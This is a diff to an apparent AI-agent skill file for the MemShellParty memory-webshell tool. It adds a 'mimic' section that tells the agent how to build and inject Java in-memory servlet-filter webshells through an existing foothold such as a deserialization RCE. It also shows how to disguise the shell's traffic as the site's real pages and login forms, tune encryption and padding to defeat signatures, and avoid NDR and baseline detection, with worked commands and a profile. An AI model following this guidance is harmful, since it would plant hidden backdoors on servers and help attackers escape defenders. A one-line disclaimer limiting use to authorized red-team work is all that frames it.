@@ -1,6 +1,6 @@
 ---
 name: memshell-party
-description: Generate Java memory shells and probe shells with MemShellParty (the `memparty` CLI or its MCP tools), verify deployed shells with `memparty connect`, run commands on them with `memparty exec`, and transfer files with `memparty upload`/`memparty download`. Use when the user wants to build a Java web memory-shell payload (Godzilla / Behinder / AntSword / Command / Suo5 / NeoreGeorg / Proxy / Custom), probe a target middleware, test that a Godzilla / Behinder / suo5 shell is alive, execute commands on a Godzilla / Behinder shell, or move files through one — for authorized security testing, red-team engagements, or research only.
+description: Generate Java memory shells and probe shells with MemShellParty (the `memparty` CLI or its MCP tools), verify deployed shells with `memparty connect`, run commands on them with `memparty exec`, and transfer files with `memparty upload`/`memparty download`. Includes the `mimic` site-mimicking protocol: the agent hand-writes a site profile (`memparty profile init`) so shell traffic blends into real business pages. Use when the user wants to build a Java web memory-shell payload (Godzilla / Behinder / AntSword / Command / Suo5 / NeoreGeorg / Proxy / Custom), probe a target middleware, test that a Godzilla / Behinder / suo5 shell is alive, execute commands on a Godzilla / Behinder shell, or move files through one — for authorized security testing, red-team engagements, or research only.
 ---
 
 # MemShellParty skill
@@ -219,6 +219,200 @@ memparty upload web1/bh9060 ./fscan.exe "C:\Windows\Temp\f.exe"
 Over MCP these are the `download_file` (`remotePath`, optional `localPath`, `force`) and
 `upload_file` (`localPath`, `remotePath`) tools, plus the usual connection fields. The local
 paths are on the machine running the MCP server.
+
+## Site-mimicking traffic (mimic protocol)
+
+`mimic` is a demo protocol that shapes shell traffic after the target site's own pages:
+requests are browser-style form POSTs; responses are real site pages with the ciphertext
+hidden in a per-shell-unique marker (a JS variable or an HTML comment). The wire codec is
+selectable per profile (`cipher` section: AES/ECB, AES/CBC with random IV, or XOR; base64 /
+base64url / hex; optional key-derived junk tail). **You write the site profile — the CLI
+does not crawl.** That is the point: you can judge which page makes believable cover; a
+regex crawler cannot.
+
+### Workflow
+
+1. **Read the site yourself.** Fetch the homepage and 2-3 representative pages (plus the 404
+   page). Note the page structure, `<title>` style, link paths, Content-Type — and judge what
+   the site's **dominant traffic** looks like: a content site serves mostly HTML documents,
+   an SPA serves mostly JSON XHR, an admin console serves mostly form POSTs.
+2. **Match the dominant traffic first.** Blending in is a statistics game: your requests
+   should be the same *shape* as what the site already serves all day. Today mimic speaks
+   HTML pages only — so on a content site mimic the high-traffic documents (homepage, list
+   pages); on an SPA/API site an HTML skin is the wrong shape (a JSON envelope skin is the
+   planned follow-up), and forcing it makes you *more* visible, not less.
+3. **Scaffold + hand-write the profile:**
+
+   ```bash
+   memparty profile init acme --site http://target:8080
+   ```
+
+   This writes a skeleton to `~/.memparty/profiles/acme.json`. Now **edit that file with your
+   own file tools** — the CLI has no "fill" command; the content is your judgment, not a
+   command's output. Fill in:
+   - `templates`: **one or more** cover pages — the server rotates among them per response,
+     so the traffic doesn't repeat one page's length/hash. 2-4 pages is plenty; pick
+     **high-traffic, self-contained** ones (the pages real users fetch all the time), and
+     paste each HTML **verbatim** — do not "improve" it, real bytes are the whole point.
+     Each entry keeps its own `title` and `contentType`.
+   - With `--dynamic-path`, also probe what the site returns for a **random** path
+     (`curl -i <site>/<random>`): some consoles answer 200 with the login page for *every*
+     unknown path instead of a 404. Your templates should match that default response —
+     a 200 answer from the shell then mirrors the site's own behavior exactly.
+   - `paths`: the site's real path vocabulary, weighted toward the hot prefixes real traffic
+     hits (nav links, sitemap entries — not dead corners), e.g. `["/api/", "/news/", "/app/"]` —
+     first-level dirs, same origin only. Used for `--dynamic-path`.
+   - `request` (optional but recommended): the request's form shape — **one object or an
+     array the client rotates among** (with optional `weight`). `secretField` is the field
+     that carries the ciphertext; `secretIn` is where it rides: `"body"` (default, a form
+     field), `"query"` (a URL parameter) or `"header"`; `fields` are decoys. **Model it on
+     a real form the site already receives** — e.g. a console login POST. Value placeholders:
+     `{{hex:N}}` (N hex), `{{b64:N}}` (N base64url), `{{uuid}}`, `{{ts}}` (unix seconds),
+     `{{int:A:B}}`. Never ship the default `pass=<cipher>` single-field body — a lone
+     `pass=` parameter is a textbook webshell signature.
+   - `cipher` (optional): the wire codec. Fields (all optional, defaults = the legacy
+     format `aes-ecb` + `base64` + `js-var` + no tail):
+     - `algorithm`: `"aes-ecb"` (fixed blocks — same plaintext ⇒ same ciphertext),
+       `"aes-cbc"` (random IV per message — same command encrypts differently every
+       time, the strongest default), `"xor"` (no JCE needed).
+     - `encoding`: `"base64"` | `"base64url"` | `"hex"`.
+     - `padTail`: `true` appends key-derived-length (0-15) random alnum garbage after
+       the encoded ciphertext — Behinder's `aes_with_magic` trick against length
+       signatures. Costs nothing, turn it on.
+     - `marker`: `"js-var"` (`var Re<md5(pass+key)[0:5]>_config="..."`) or
+       `"html-comment"` (`<!--Re..._config:...-->`) — pick whichever looks more at
+       home in the cover page.
+     ⚠️ The cipher is **baked into the filter at build time**. Editing `cipher` in the
+     profile afterwards desynchronizes client and server — rebuild + re-inject.
+4. **Use it:**
+
+   ```bash
+   memparty connect -u http://target/ -t mimic --pass <pass> --key <key> \
+     --profile acme --dynamic-path
+   memparty exec acme/mimic --cmd "whoami"   # profile rides along in the saved target
+   ```
+
+### Worked example
+
+Target: a company portal at `http://192.0.2.1:8080` — a classic content site (HTML
+documents dominate; no SPA).
+
+1. Fetch `/` and two linked pages. Observations: every page shares the same header/footer;
+   `/news/` is linked from the nav and returns a short self-contained list page; the nav
+   links are `/products/`, `/news/`, `/about/`; everything is `text/html; charset=utf-8`.
+2. `memparty profile init acme --site http://192.0.2.1:8080`.
+3. Edit `~/.memparty/profiles/acme.json` so it reads (template shortened here for display —
+   the real file must contain the page's FULL verbatim HTML):
+
+   ```json
+   {
+     "name": "acme",
+     "site": "http://192.0.2.1:8080",
+     "createdAt": "2026-07-19T08:00:00.000Z",
+     "templates": [
+       {
+         "title": "新闻动态 - ACME 科技",
+         "template": "<!DOCTYPE html>\n<html lang=\"zh-CN\">\n<head>...full verbatim HTML...</html>",
+         "contentType": "text/html; charset=utf-8"
+       },
+       {
+         "title": "产品中心 - ACME 科技",
+         "template": "<!DOCTYPE html>\n<html lang=\"zh-CN\">\n<head>...another page...</html>",
+         "contentType": "text/html; charset=utf-8"
+       }
+     ],
+     "paths": ["/products/", "/news/", "/about/"],
+     "request": {
+       "secretField": "verCode",
+       "fields": [
+         {"name": "csrftoken", "value": "{{hex:32}}"},
+         {"name": "j_username", "value": "admin"},
+         {"name": "j_password", "value": "{{hex:24}}"},
+         {"name": "agreement", "value": "on"}
+       ]
+     }
+   }
+   ```
+
+   Why these choices: `/news/` over the homepage — equally high-traffic but no carousel
+   JS/images, so no missing sub-request waterfall; two templates so consecutive responses
+   differ in length and bytes; `paths` are exactly the nav links real users click, not
+   guessed words; the `request` block mirrors the site's own login form, so the shell POST
+   is indistinguishable from someone signing in. (Templates shortened here for display —
+   the real file must contain each page's FULL verbatim HTML. A legacy single
+   `template`/`title`/`contentType` triple still loads, it just can't rotate.)
+4. Verify it parses, then connect:
+
+   ```bash
+   memparty profile show acme      # schema check happens here too
+   memparty connect -u http://192.0.2.1:8080/ -t mimic --pass s3cr3t --key k3y \
+     --profile acme --dynamic-path
+   # OK   mimic http://192.0.2.1:8080/
+   #      round-trip ok (profile=acme; dynamic path http://192.0.2.1:8080/news/x7q2mzab)
+   ```
+
+### What mimic handles vs. what you decide
+
+- Automatic: the selected codec (key = md5(key)[0:16] for every algorithm), per-shell
+  derived response delimiters, form-body encoding, browser-consistent request headers,
+  credential round-trip on `connect`.
+- Yours: the template page, the path vocabulary, the request pacing. Filter/listener-type
+  memory shells answer on any path, which is what makes `--dynamic-path` legitimate — for a
+  fixed-URL shell just omit the flag.
+- Limits: exec only (no upload/download); request timing/method mix is fixed, so pace your
+  commands like a patient human.
+
+### Server side — `memparty custom build`
+
+The server half is a plain `javax.servlet.Filter` generated FROM the profile and compiled
+locally — one command does the whole chain:
+
+```bash
+memparty custom build --profile acme --server Tomcat
+```
+
+What happens inside:
+
+1. renders `MimicFilter<rand>.java` from the profile (templates, carrier fields, **the
+   `cipher` section is baked in here**) + random `pass`/`key` (or `--pass/--key`);
+2. compiles it with the local JDK (`javac` on PATH, servlet API jar bundled — no other
+   dependency);
+3. submits the class to the MemShellParty backend as `shellTool=Custom`, which wraps it
+   with the injector for `--server` (any server from `memparty config tools` — the filter
+   itself has zero middleware specifics) and packs it with `--packer`
+   (default `DefaultBase64`);
+4. writes an output dir (default `<profile>-build/`): the `.java`/`.class`, one
+   `payload-*.txt` per pack variant, and **`manifest.json`** — the single source of truth
+   for the follow-up (credentials, cipher, class names, ready-made connect command).
+
+Then: inject the payload through your foothold (deserialization RCE `defineClass`, an
+existing shell that evaluates scripts, an agent loader…), and connect with the printed
+command — a successful `connect` auto-saves the target, afterwards
+`memparty exec <host>/mimic --cmd "id"` needs no flags.
+
+Notes that matter:
+
+- **Random class name every build** (`--out` keeps builds apart): a running JVM can't
+  re-define a class, so re-injection NEEDS the fresh name — never reuse one.
+- The printed `--pass/--key` are random per build unless you pin them; they're in
+  `manifest.json`, not in your shell history if you use `--json`.
+- The filter probes carriers with `getParameter()`/`getHeader()` only (never reads the
+  body stream), passes undecryptable values through `chain.doFilter`, and answers errors
+  with the plain cover page — it coexists with the site's real forms and other shells.
+- Filter-type deployment truth learned on a real console: **dynamic path is conditional
+  on the target app's own filters** — probe a random path first, fall back to the fixed
+  working path when the app answers everything itself.
+
+### Reality check before relying on it
+
+Run `memparty demo` once and read the printed request URL and response: the traffic should
+be indistinguishable from a normal page view at a glance. Two ways it still stands out:
+
+- **Missing sub-requests**: if your template page has assets (CSS/JS/images) a real browser
+  would fetch, a NDR notices their absence — prefer self-contained pages.
+- **Volume mismatch**: signature devices look at bodies, but statistical detection looks at
+  baselines — hitting a rarely-used path shape (or HTML on an API site) deviates from it.
+  That is why the dominant-traffic rule above outranks everything else.
 
 ## Step 7 — Save targets, switch by name
 
